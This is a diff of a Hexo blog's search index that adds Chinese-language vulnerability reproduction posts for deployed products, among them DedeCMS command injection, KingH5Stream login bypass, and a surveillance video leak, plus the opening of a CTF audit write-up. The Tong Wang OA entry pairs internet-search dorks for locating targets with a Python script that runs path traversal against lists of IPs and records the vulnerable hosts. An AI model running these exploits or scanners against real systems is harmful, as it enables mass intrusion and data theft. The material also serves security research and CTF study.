@@ -1,6 +1,179 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2024/11/14 CNVD漏洞跟踪复现报告</title>
+    <url>/2024/11/16/CNVD%20reoprt%201/</url>
+    <content><![CDATA[<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCvk6Hs9CQT9FOahNicDshCZjkjicdicedSTgANzu5mWHn4zp62Af0hSHibA/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h1
+id="北京亚控科技发展有限公司swagger-kingdbconnector存在信息泄露漏洞">北京亚控科技发展有限公司Swagger
+KingDBConnector存在信息泄露漏洞</h1>
+<h4 id="漏洞描述">漏洞描述</h4>
+<p>北京亚控科技发展有限公司是一家工业自动化和信息化软件平台高科技企业。</p>
+<p>北京亚控科技发展有限公司KingH5Stream系统存在信息泄露，攻击者可利用该漏洞获取录像及系统配置文件等敏感内容。</p>
+<p>攻击路径</p>
+<p>/mediastore/</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCx3MXXmAsesia8ywuOlYBBb8IUuUGgySb8sluUTbCQwF0KgzbaFrgYOQ/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>危害</p>
+<p>可看监控录像内容</p>
+<h1 id="dedecms命令注入漏洞">DedeCMS命令注入漏洞</h1>
+<h4 id="漏洞描述-1">漏洞描述</h4>
+<p>DedeCMS（织梦内容管理系统）是一套基于PHP的开源内容管理系统（CMS）。该系统具有内容发布、内容管理、内容编辑和内容检索等功能。</p>
+<p>DedeCMS存在命令注入漏洞，该漏洞源于article_string_mix.php文件未能正确过滤构造命令特殊字符、命令等。攻击者可利用该漏洞导致任意命令执行。</p>
+<p>攻击路径</p>
+<p>/dede/article_string_mix.php</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNClonUBOp91TfywAJFFKd7QXibhosc2mIQKO0r8I5OYnZRIMdrA8DDkvA/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCtzC5ZGmxgUniaJReY1KMFNOCmZd75NdtOQbibllibsRib3nCPqbU6XtCKg/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>找个一句话免杀马写里就行，过滤不严</p>
+<p>危害</p>
+<p>Getshell</p>
+<h1 id="simpcms跨站脚本漏洞">SimpCMS跨站脚本漏洞</h1>
+<h4 id="漏洞描述-2">漏洞描述</h4>
+<p>SimpCMS是一个基于PureEdit的易于使用的CMS。</p>
+<p>SimpCMS
+0.1版本存在跨站脚本漏洞，该漏洞源于应用对用户提供的数据缺乏有效过滤与转义，攻击者可利用该漏洞通过注入到/admin.php的标题字段的精心设计的有效负载执行任意Web脚本或HTML。</p>
+<p>攻击路径</p>
+<p>/admin/index.php</p>
+<p>进入后台</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCS5dq1whgcF3F0H9PjuI0DIGJRZibSXmAMW3AdopG0yD4Zic31rUyk5ag/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>直接打xss payload</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66yKPwsiaXOpWR01xOaFpTUNCiaLYtZ3cUDEfWAPvMLiaeXgNDrDCN5Q4x9OlQDMUJma2fUMshfmh3Fhg/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>危害</p>
+<p>钓鱼</p>
+<h1
+id="北京亚控科技发展有限公司kingh5stream存在逻辑缺陷漏洞">北京亚控科技发展有限公司KingH5Stream存在逻辑缺陷漏洞</h1>
+<p>(这个不是最新的，看到这个系统爆出来洞就去挖，挖够了10个资产结果告诉我是23年的CNVD
+emmmm)</p>
+<h4 id="漏洞描述-3">漏洞描述</h4>
+<p>北京亚控科技发展有限公司是一家自动化软件平台高科技企业。</p>
+<p>北京亚控科技发展有限公司KingH5Stream存在逻辑缺陷漏洞，攻击者可利用该漏洞获取用户密码，登录系统。</p>
+<p>进入登陆界面：</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsicic6El3D9AN82AXxGFj4MDJqCYrpthH3OmkEOQpc9icFSnj3OLBLEkog/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>用户名admin，密码随便填</p>
+<p>请求包：</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsvu6YiatUlZRGZEUvH5WdKURC7DFdMwAgBrfEibvk8XKG85gblbYQJ2dg/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>查看响应包：</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsjKNVe7KP8QGXJsqfCtgumiaIWueW5Vhw6Oduqj4SUIJ7O52UMJInUNQ/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>修改bStatus和strSession参数，将前者改为true，后者填个1，直接放包</p>
+<p>发现放包后系统请求了另一个包</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsWkRXyw2wDMQcd2gyiciaplokCqL42Nyl6VPVsQ9chZClqXZicNt8mowJg/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>那串hash值应该就是管理员密码hash值，解不解出来无所谓，放包之后直接进入系统</p>
+<figure>
+<img 
+
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/jZReoHLb66xJe131bqFVcLe794g0wBpsXyQcIV8CsuYcs9IXuiaVL5SNDJHdaYFuJibE0ibqlj53yu6qS6O5pf4qw/640?wx_fmt=png&amp;from=appmsg"
+                     
+alt="img" 
+                >
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Shi Bang IP Guangbo Unauthorized</title>
     <url>/2024/11/08/CNVD-2023-76197/</url>
     <content><![CDATA[
@@ -53,32 +226,6 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>Wei Ning sql inject</title>
-    <url>/2024/11/08/CNVD-2024-13639/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="8df295a5dfd048774a2ab55be1a6d8c53a417eca1681ea076492812e8fb4056a">711009fc8ce7d12d708ecc49639eba1a854ee23c300c70549eb674c6b20dbb1c30a9bd0c883d1da0f9d0f7deb48e90a554a8d9be87a1cee9932f8579489c00b295e3f40d1ca3291a48b1b9d73e27152242d55d49f63d6d1d7b107d5f6fad0d68f40d99c7d0228ee05d28f505e89477e4ef1e91395b83925d4eae25fe4d6111b7dddbb5cd231dc01007217e2248abf7aeda99aa6649ec89d3b745ec912d2ed9f7e40f86c6a7b52dd1ce2f0464764f96ed46c713a6ce0d234138fad0531b387d8495d3622e02e9c9f4506f2ddbe65749e0959724825ff3255dff0b43b382991e03e7c420066ce534c48ef789cb0071ce4a757c7655cfcd4cf0ba11fe4bc0c0c244243f6266d5083d7117e125917d04dc03b123d4de8cb2013ee271691f68873022ac3fa387f49ae44c55ec43bcaa9f0234273e6623d662d8cd26b920e6adf259b56cf4e8ea64f839b1a3da6c28c562b0bd290e55251110a82fcac0d11b34d89cee0647b5a6e0da9e9a62b309351c65d7270135bd781c851c4a8ea66c9a84b8f94d19fd7e758af6c74b9fcb11f09eb8dc011a66d67a7fa589cf3b5426ca53730463c506f588f657019b65131418de5dc2d40bb011f98824f029a8beb6043c6e9e3db447171873db565dc39e428c8f80f3d7f2b2640334974993c2d97e2943ed134ea8ef1e50af8599cab94c1cc2cb5ee1d54db3b3a3de2b905294e1fe415ebaa0a3a315c3c7dba4c45ca2890c320a35241ee9f72945e098d469d1689a0cce76dc135d842fa0883fe10cb71969ec1043099043a966d7cfd68e40724edc1669ab7463a49ade847cb311f05d6f4fdb41d1ebbb9b24a41ad402e22c8dabfdaaf16e8b4a97a4b5d9bbfdc99c75a022b15ffb5f0e755efecfe0e76bf0be8899323b3669fe627f83db4abdc8a4e617a421248c9cec7b584f920eb43e633d51a957369ab9dd8576db45bb35e70806697b2547b00603c6a37cc546fb3a8672809ecffdfb38a9d67c2462484483e05aa81ec6c00db16bff8b5f85b5c56dc6160225cf20519173694b19155385b738546d1dd682d2140509be51722d54322832fe2b7cbb04578d986dfd2997f37b00a0475a6aaa0170eb816f040119300eca1ad47c9c2aa5490a688ef15136ed04a6576600e166f2ffc66f6a93a339b44fe5e4e98400dedb237a18925ee3088c9e5959f1bf7331773cbd82b2607375ef3e0568953ac15d939cf232020cd861b6b084d115b9b4bc5a25d5</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
-<script data-swup-reload-script type="module">
-import {initHBE} from "/js/plugins/hbe.js";
-  console.log("hexo-blog-encrypt: loaded.");
-    initHBE();
-</script>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>An Mei Shi ji hotel Sql Inject</title>
     <url>/2024/11/08/CNVD-2024-21112/</url>
     <content><![CDATA[
@@ -110,6 +257,32 @@ import {initHBE} from "/js/plugins/hbe.js";
     <content><![CDATA[
 <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
   <script id="hbeData" type="hbeData" data-hmacdigest="497b095794d9304f221dd42a1593369c5f11cc356a12d1095141c21fdfac5b22">11f05ec438d0ff2a949da9113ef4898ba65555396aa4fa8b9c5ba3970e51640ebb8f04193d34b093c073b47ba4dca48064e6df8d691b9d1c32d2a98ac388cd371cdc9050f38c38a71260e4f93b144337ab451ee47c410254ce630d9af922a700e77316f4beb978db18fddcd53274c8450c123d2335456a4d158b4ca3b0493e93c23e55646268a09879166f4c9360892391af277ef9d443d213cdfd86c67b607a3d79ad7f91c946d4bb71634b9972b52a050af2c84893a36507a6f6015e49a625ce6c2c3bca7820a1ef140b621d797b53f48ca0ace186eb69397645d2bca0133cd15bc9aa7e10a56be071e444dd820c480d7b252e10eec2b8577e00657a84f33918033b089b16f0851a0ebe8a0be26e95ee3bc8570a29f9305dab6e647e8174641ce70f2951cf70664fcc706c389a94f1b9900963aff3e074d2fb44c07ca298a8b9f3ba507566d8fb4674fa7a744ee86c22e7ebc0507eb5297db13db2181ef96cc1ff628a41fc1cab772dce5096764fcf4ffec1dd4caacc2b4d8c816413a4cbfe83192f15510f02e3beb04be96cd7d859db00cbed9076a7d3cf2c1a9bed454afa15735fafccc8e52768a80ea4d724e1d3ce5fd4844ec4b65a1af3f08fe9f95dec13111d1236f9bbeda981c2683a17232a23a88f9b1541e0009b9b69a1061e276a0f93c2f763e87b6406645ca350fb27de712c24c2005658ed3db59a56a23d2474d921e0bee79ec99879e611ca539463e933c492c1d13384b9c775527771169d6fd789ca1cff354bf85cf768fe9dbb2c848a69ef36b07a48a07c131e15bccb927517a1e5293037435531891cf5c1e36f92d49383e12c6f69c7449c7c677d255d9e6f1e223a821e5ea6c63cbbc68433f7e60aeacca64f11eb91dc45112e4a94126403bb75be6b75a094f292478bb3407d6d7df3ecaed4f85d025523272f8e129a26f8a5c8a0ee64b1ebb721c2e9460dbca3ec7dcbf1d9aa196a0bff46f0d7506073fe470c85b5e9852e2f0633db3970927888b92a1e00bb32031231f92774ee2646ff816d043dbfa6550fe3aadd5c0397f6d6eb34aae42eeb03e74858ca02e8a90550975fdf4eeb8a9e54e8c81bb5944a2788f16765824459700f1346b605cde33545138a8669bd5210b52d6d3aede14f51b5437ee475dde98b0cea0973250993f9d663d12c1263f76e1c8b19836e1bfce81cee4f5c67c58165d2e1bb900f72ac7993f13200c9eab57229ab15128bd43adb7189bb978aeb2ae7cd6e79623851adff262de1cce524ec8a54c04269fb78c4a25a2493800b9657728cfe13e851f7654eb26103bd73fe55d02d4877d35302dec94aca25f7651ae449cdb0ac4b236f65a2e16e6f5995ebfb06184a9f9fa77f192d5219398fb06c57496112cdee561063eb1fd6ccb594a92cc3fcb35055e4782257a39f3b9790978dbf473aef1757d4398bd9ba142afe8354f9f250eb0b10a1c7aa61546728f671a53d94dafa2e81fca3053a5cf68eb68cfafe81d9a85e55e29353a5d19fef49edadb23a81f583d5ba6935f15fdb6a9c4c4aa38d883b43b8e25bacfe2baa15eda5098f8186b35f71f08e8f9bf04289dfa790f10ac9251c674c296732e28ff70756f42069001843dc9df68f215cebdc9891b22593427bd1d25c2cdcdb9a5cad40829a8db8621d548398a5f2d2a89001533df4ba092e0cfa871f4ee2323ee00a4a0a1db84c478320d19cd834d6f855baf3cb34ef0e57f4ae25f2718bd710fd31f1a801d18132e51ce8384778b895639cd047084bd0d777fc5b11d3a5aacb2452099f4881add9edf9bf79cab9d9ecc32d3dea96c5a585b21e0fe1f67ee4a03e98f9c1a6f5f12af543ac62f295e481f4e473c8c06dd76ddb7394bc95044e5416042dd02a80a388f16723067be4d2d89fa90a62c918abb52966fcbc61a77f9fca79ed2e1de9510b38f663305b9ef11a7b89dc52412dbdcf7206f48e721c3f9f68d24c933981dc170b9220cdd9ec6e16ef25a5b014b6954f0760ec740807026186b3156ff168bc9a323ef7564bc7dbd82c7e9fb66f4dc9ef9c4704118c8022006170da16566e7dd1d868e2717fb20ecaec7dac3eaccf2470de4364716b5404b07deb950a9f239cd0a9c6c56dc0a9b1772b28ec260a42093d9583619f133089548a0ebb626c01726f2e8f5c325f460421d761a4baecc895eab544152174691e12576511efe33ed84b5520bc2beaf02ac65d5d29982fd4494efd472b18bc1b3beef4799eb2982de508129869b457ca5a74210f4d4bebc483ee4f246fbda3d5574da15cbe210054a81558e97e38b16c1f3b1c3156b61425fa4902b664e388f1ba7f4aa7fcb23fa64e793cc96a1b0f736daf7fe1e41717358b6a710f14b8e91e1b8f93063ad79bb65b9f526a045073ce5e8e44523ef90eeb93502315a276e998b733a49f24431ef0b632d17f27d05d653a5d7b0db723b77f04db41fce4c226a390bb2dfba12c81ba96984c40f77935694829ead7a09e5f0d367fb4b2619925f457b6ee084f2b0d27a256df9336da7957f37cf5597a0e446be7dd35378470aa0612bea76208e2372191b19c8178fdd384fb06073d79348f44c8fc94365a68f773d90dcd12f9d9024a592b01fd23b0165d7ed0cf2faa23d6f5c72400f7422feece1d8c210bef54aa0fc355464ce310517fe32d3998f362142ee7fcc649fc8fa5208e6a8bf8704a10b382fd9d3379058b8c26d0b7cdf65cde4175433cebd72340da3e35710c51920968de03b14ed55573037b67c473266e4997a18110efa73f4b3c88b4231b6d7d2669aaebb8d4295588fcab88d180f7a12204049b5bc023cda44418dbd2cc855634f7af4d3d8d35d42c6276fadb1e3071da473115ce8129a2fdd6aa686c0408e1b19baa16179d5d28a1732ae88c6f523120070d6f7dbf0d6c4f71752441d113aaf9d0ee0b9280913076ad28097155083794496d48faa7f7c6519f9937b7d76b019c2b0d1f14695086e867e9cc5164797711781df7da874125e72c39d08d6cf4640d12b30f0c236bb0af36a0f5e9eee38697242353dff033c1a4c69b60e38587035d5c9610cefa2c4d2ac368505c3e34706ecebbc8ee6e558f44af93bfd6fea9ce0203778ed430eab9b17694d59aa222ec0ff9ac1298cc92ffdea87e5519f0547595a567f46c3d7c3608440d90517a20e35c0f8939dd04318bda92e5463627daa935e5f0b7b2ae34f0e88ba615ba6fb18cb56bf1f5f0bc427e0e2715edc3a59a08e271a5bdb811e5f78d30256771666c9b1997a8cb4182bd91c81aa11fbba50937285ac11a8d4c55e9f51aad3f533968b541ae3fe11050c92882fa</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
+<script data-swup-reload-script type="module">
+import {initHBE} from "/js/plugins/hbe.js";
+  console.log("hexo-blog-encrypt: loaded.");
+    initHBE();
+</script>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Wei Ning sql inject</title>
+    <url>/2024/11/08/CNVD-2024-13639/</url>
+    <content><![CDATA[
+<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="8df295a5dfd048774a2ab55be1a6d8c53a417eca1681ea076492812e8fb4056a">711009fc8ce7d12d708ecc49639eba1a854ee23c300c70549eb674c6b20dbb1c30a9bd0c883d1da0f9d0f7deb48e90a554a8d9be87a1cee9932f8579489c00b295e3f40d1ca3291a48b1b9d73e27152242d55d49f63d6d1d7b107d5f6fad0d68f40d99c7d0228ee05d28f505e89477e4ef1e91395b83925d4eae25fe4d6111b7dddbb5cd231dc01007217e2248abf7aeda99aa6649ec89d3b745ec912d2ed9f7e40f86c6a7b52dd1ce2f0464764f96ed46c713a6ce0d234138fad0531b387d8495d3622e02e9c9f4506f2ddbe65749e0959724825ff3255dff0b43b382991e03e7c420066ce534c48ef789cb0071ce4a757c7655cfcd4cf0ba11fe4bc0c0c244243f6266d5083d7117e125917d04dc03b123d4de8cb2013ee271691f68873022ac3fa387f49ae44c55ec43bcaa9f0234273e6623d662d8cd26b920e6adf259b56cf4e8ea64f839b1a3da6c28c562b0bd290e55251110a82fcac0d11b34d89cee0647b5a6e0da9e9a62b309351c65d7270135bd781c851c4a8ea66c9a84b8f94d19fd7e758af6c74b9fcb11f09eb8dc011a66d67a7fa589cf3b5426ca53730463c506f588f657019b65131418de5dc2d40bb011f98824f029a8beb6043c6e9e3db447171873db565dc39e428c8f80f3d7f2b2640334974993c2d97e2943ed134ea8ef1e50af8599cab94c1cc2cb5ee1d54db3b3a3de2b905294e1fe415ebaa0a3a315c3c7dba4c45ca2890c320a35241ee9f72945e098d469d1689a0cce76dc135d842fa0883fe10cb71969ec1043099043a966d7cfd68e40724edc1669ab7463a49ade847cb311f05d6f4fdb41d1ebbb9b24a41ad402e22c8dabfdaaf16e8b4a97a4b5d9bbfdc99c75a022b15ffb5f0e755efecfe0e76bf0be8899323b3669fe627f83db4abdc8a4e617a421248c9cec7b584f920eb43e633d51a957369ab9dd8576db45bb35e70806697b2547b00603c6a37cc546fb3a8672809ecffdfb38a9d67c2462484483e05aa81ec6c00db16bff8b5f85b5c56dc6160225cf20519173694b19155385b738546d1dd682d2140509be51722d54322832fe2b7cbb04578d986dfd2997f37b00a0475a6aaa0170eb816f040119300eca1ad47c9c2aa5490a688ef15136ed04a6576600e166f2ffc66f6a93a339b44fe5e4e98400dedb237a18925ee3088c9e5959f1bf7331773cbd82b2607375ef3e0568953ac15d939cf232020cd861b6b084d115b9b4bc5a25d5</script>
   <div class="hbe hbe-content">
     <div class="hbe hbe-input hbe-input-default">
       <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
@@ -237,6 +410,51 @@ alt="image.png"
       </tags>
   </entry>
   <entry>
+    <title>Tong Wang OA tooneAssistantAttachement File read</title>
+    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
+    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
+<p>​
+同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
+<ul>
+<li>Fofa：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Hunter：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Quake：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
+<h4 id="利用脚本">利用脚本</h4>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+]]></content>
+      <tags>
+        <tag>day</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2024-9076 dedecms命令注入漏洞复现</title>
     <url>/2024/11/13/dedecms_CVE-2024-9076/</url>
     <content><![CDATA[<blockquote>
@@ -303,6 +521,37 @@ alt="image.png"
 ]]></content>
       <tags>
         <tag>JS逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网杯2024-platform</title>
+    <url>/2024/11/08/qiangwangbei2024platform/</url>
+    <content><![CDATA[<p>扫描网站主页，获得www.zip源码，开始审计</p>
+<p>查看login.php，跟踪到index.php：</p>
+<figure>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic.imgdb.cn/item/672e18f0d29ded1a8c6cbe11.png"
+                     
+alt="image.png" 
+                >
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>发现该系统将咱传入的username和password的明文放到session中(难评，跟进filterSensitiveFunctions()函数：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterSensitiveFunctions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$sessionFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionFilePath</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sessionFile</span>)) &#123;</span><br><span class="line">        <span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Session file not found.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>发现调用getSessionFilePath()，跟进：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getSessionFilePath</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sessionPath . <span class="string">&quot;/sess_&quot;</span> . <span class="variable language_">$this</span>-&gt;sessionId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>看不懂，反正是返回了一个路径，回到filterSensitiveFunctions()函数中</p>
